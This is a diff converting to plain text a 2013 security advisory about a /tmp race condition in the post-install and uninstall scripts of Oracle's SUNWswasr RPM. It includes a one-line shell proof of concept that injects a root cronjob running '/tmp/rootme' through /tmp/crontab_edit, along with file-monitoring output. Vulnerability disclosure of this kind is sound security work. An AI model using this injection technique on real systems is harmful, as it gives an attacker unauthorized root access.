@@ -1,42 +1,75 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 11&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; SUNWswasr RPM post install /tmp race condition&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2013-01-31&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://updates.oracle.com/Orion/Services/download?type=readme&amp;aru=15864534">https://updates.oracle.com/Orion/Services/download?type=readme&amp;aru=15864534</a>"&gt;<a href="https://updates.oracle.com/Orion/Services/download?type=readme&amp;aru=15864534&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://updates.oracle.com/Orion/Services/download?type=readme&amp;aru=15864534&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Oracle Systems&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2013-01-31&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; bugtraq email&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;Auto Service Request (ASR) is a secure, scalable, customer-installable software feature of warranty and Oracle Support Services that provides auto-case generation when common hardware component faults occur. ASR is designed to enable faster problem resolution by eliminating the need to initiate contact with Oracle Support Services for common hardware component failures, reducing both the number of phone calls needed and overall phone time required. ASR also simplifies support operations by using electronic diagnostic data. Easily installed and deployed, ASR is completely controlled by you, the customer, to ensure security. ASR is applicable only for component faults. Not all component failures are covered, though the most common components (such as disk, fan, and power supplies) are covered.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The post-install script for SUNWswasr RPM handles files in /tmp insecurely.
-</p><p>I suspect a race condition exists where these two files can be used to either clobber root owned files or inject malicious cronjobs into roots cron:
-</p><p>/tmp/tmpVariable<br/>
-/tmp/crontab_edit
-</p><p>[root@oracle-lnx-lab02 ~]# rpm -Uvh SUNWswasr-4.3.1-20130117131218.rpm Preparing... ########################################### [100%]
-</p><p>Copyright [2008,2012], Oracle and/or its affiliates. All rights reserved.
-</p><p>License and Terms of Use for this software are described at <a href="https://support.oracle.com/">https://support.oracle.com/</a> (see Legal Notices and Terms of Use).
-</p><p>1:SUNWswasr ########################################### [100%] 
-Directory /var/opt/SUNWsasm/configuration/caseinfo created. 
-Directory /var/opt/SUNWsasm/configuration/supportfile created. 
-ASR Manager Auto Update functionality has been enabled by default. 
-Please ensure that ASR manager is registered with ASR backend to get the software updates. 
-Installation of SUNWswasr was successful.
-Lets fireup fsnoop[1] and take a look:<br/>
-[C] -rw-r--r-- 1 root root 0  Thu Jan 31 14:30:12 2013 /tmp/crontab_edit
-[U] -rw-r--r-- 1 root root 100  Thu Jan 31 14:30:12 2013 /tmp/crontab_edit
-[C] -rw-r--r-- 1 root root 0  Thu Jan 31 14:30:12 2013 /tmp/tmpVariable
-[U] -rw-r--r-- 1 root root 2  Thu Jan 31 14:30:12 2013 /tmp/tmpVariable
-[U] -rw-r--r-- 1 root root 101  Thu Jan 31 14:30:12 2013 /tmp/crontab_edit
-[U] -rw-r--r-- 1 root root 143  Thu Jan 31 14:30:12 2013 /tmp/crontab_edit
-[U] -rw-r--r-- 1 root root 188  Thu Jan 31 14:30:12 2013 /tmp/crontab_edit
-[D] F /tmp/tmpVariable<br/>
-[D] F /tmp/crontab_edit&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=11"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;I was able to inject my own cronjob in &lt;span style="color: #b1b100;"&gt;as&lt;/span&gt; root with the following simple PoC&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ &lt;span style="color: #b1b100;"&gt;while&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900; font-weight: bold;"&gt;true&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt; &lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;span style="color: #b1b100;"&gt;do&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;* * * * <em> /tmp/rootme&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;crontab_edit&lt;span style="color: #339933;"&gt;;&lt;/span&gt; done&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;root&lt;span style="color: #339933;"&gt;@&lt;/span&gt;oracle&lt;span style="color: #339933;"&gt;-&lt;/span&gt;lnx&lt;span style="color: #339933;"&gt;-&lt;/span&gt;lab02 ~&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# crontab -l&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;12&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;24&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;36&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;48&lt;/span&gt; &lt;span style="color: #339933;"&gt;</em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;<em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;</em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;<em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;opt&lt;span style="color: #339933;"&gt;/&lt;/span&gt;SUNWsasm&lt;span style="color: #339933;"&gt;/&lt;/span&gt;bin&lt;span style="color: #339933;"&gt;/&lt;/span&gt;sasm start&lt;span style="color: #339933;"&gt;-&lt;/span&gt;instance &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;dev&lt;span style="color: #339933;"&gt;/&lt;/span&gt;&lt;span style="color: #009900; font-weight: bold;"&gt;null&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;2&lt;/span&gt;&lt;span style="color: #339933;"&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #339933;"&gt;</em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;<em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;</em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;<em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;</em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rootme &lt;span style="color: #339933;"&gt;&amp;lt;---&lt;/span&gt; prepended and contains our malicious shell&lt;span style="color: #339933;"&gt;/&lt;/span&gt;binary&lt;span style="color: #339933;"&gt;,&lt;/span&gt; see exploit above&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;##Cronjob entry for ASR Auto Rules Update &lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;7&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;3&lt;/span&gt; &lt;span style="color: #339933;"&gt;<em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;</em>&lt;/span&gt; &lt;span style="color: #339933;"&gt;*&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;opt&lt;span style="color: #339933;"&gt;/&lt;/span&gt;SUNWswasr&lt;span style="color: #339933;"&gt;/&lt;/span&gt;bin&lt;span style="color: #339933;"&gt;/&lt;/span&gt;update_rules&lt;span style="color: #339933;"&gt;.&lt;/span&gt;sh&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;The uninstall script is just &lt;span style="color: #b1b100;"&gt;as&lt;/span&gt; sloppy&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;C&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;??&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;U&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;??&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;C&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;???&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;U&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;???&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;C&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;???&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;U&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;???&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;D&lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt; F &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;asrtab&lt;span style="color: #339933;"&gt;.&lt;/span&gt;??&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;did they mean to &lt;span style="color: #000000; font-weight: bold;"&gt;use&lt;/span&gt; $$ &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; process Pid?&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-install.html">http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-install.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-install.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-install.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 11
+Title: SUNWswasr RPM post install /tmp race condition
+Author:Larry W. Cashdollar, @_larry0
+Date: 2013-01-31
+Download Site: https://updates.oracle.com/Orion/Services/
+download?type=readme&aru=15864534
+Vendor:Oracle Systems
+Vendor Notified: 2013-01-31
+Vendor Contact: bugtraq email
+Description: Auto Service Request (ASR) is a secure, scalable, customer-
+installable software feature of warranty and Oracle Support Services that
+provides auto-case generation when common hardware component faults occur. ASR
+is designed to enable faster problem resolution by eliminating the need to
+initiate contact with Oracle Support Services for common hardware component
+failures, reducing both the number of phone calls needed and overall phone time
+required. ASR also simplifies support operations by using electronic diagnostic
+data. Easily installed and deployed, ASR is completely controlled by you, the
+customer, to ensure security. ASR is applicable only for component faults. Not
+all component failures are covered, though the most common components (such as
+disk, fan, and power supplies) are covered.
+Vulnerability:
+The post-install script for SUNWswasr RPM handles files in /tmp insecurely. I
+suspect a race condition exists where these two files can be used to either
+clobber root owned files or inject malicious cronjobs into roots cron: /tmp/
+tmpVariable /tmp/crontab_edit [root@oracle-lnx-lab02 ~]# rpm -Uvh SUNWswasr-
+4.3.1-20130117131218.rpm Preparing...
+########################################### [100%] Copyright [2008,2012],
+Oracle and/or its affiliates. All rights reserved. License and Terms of Use for
+this software are described at https://support.oracle.com/ (see Legal Notices
+and Terms of Use). 1:SUNWswasr ###########################################
+[100%] Directory /var/opt/SUNWsasm/configuration/caseinfo created. Directory /
+var/opt/SUNWsasm/configuration/supportfile created. ASR Manager Auto Update
+functionality has been enabled by default. Please ensure that ASR manager is
+registered with ASR backend to get the software updates. Installation of
+SUNWswasr was successful. Lets fireup fsnoop[1] and take a look: [C] -rw-r--r-
+- 1 root root 0 Thu Jan 31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1
+root root 100 Thu Jan 31 14:30:12 2013 /tmp/crontab_edit [C] -rw-r--r-- 1 root
+root 0 Thu Jan 31 14:30:12 2013 /tmp/tmpVariable [U] -rw-r--r-- 1 root root 2
+Thu Jan 31 14:30:12 2013 /tmp/tmpVariable [U] -rw-r--r-- 1 root root 101 Thu
+Jan 31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1 root root 143 Thu Jan
+31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1 root root 188 Thu Jan 31
+14:30:12 2013 /tmp/crontab_edit [D] F /tmp/tmpVariable [D] F /tmp/crontab_edit
+CVE-
+JSON:Export
+Exploit Code:
+   1. I was able to inject my own cronjob in as root with the following simple
+      PoC:
+   2.  
+   3. $ while (true) ;do echo "* * * * * /tmp/rootme" >> /tmp/crontab_edit;
+      done
+   4.  
+   5. [root@oracle-lnx-lab02 ~]# crontab -l
+   6. 0,12,24,36,48 * * * * /opt/SUNWsasm/bin/sasm start-instance > /dev/null
+      2>&1
+   7.  
+   8. * * * * * /tmp/rootme <--- prepended and contains our malicious shell/
+      binary, see exploit above.
+   9. ##Cronjob entry for ASR Auto Rules Update
+  10. 7 3 * * * /opt/SUNWswasr/bin/update_rules.sh
+  11.  
+  12. The uninstall script is just as sloppy:
+  13.  
+  14. [C] F /tmp/asrtab.??
+  15. [U] F /tmp/asrtab.??
+  16. [C] F /tmp/asrtab.???
+  17. [U] F /tmp/asrtab.???
+  18. [C] F /tmp/asrtab.???
+  19. [U] F /tmp/asrtab.???
+  20. [D] F /tmp/asrtab.??
+  21.  
+  22. did they mean to use $$ for process Pid?
+  23.  
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-
+install.html
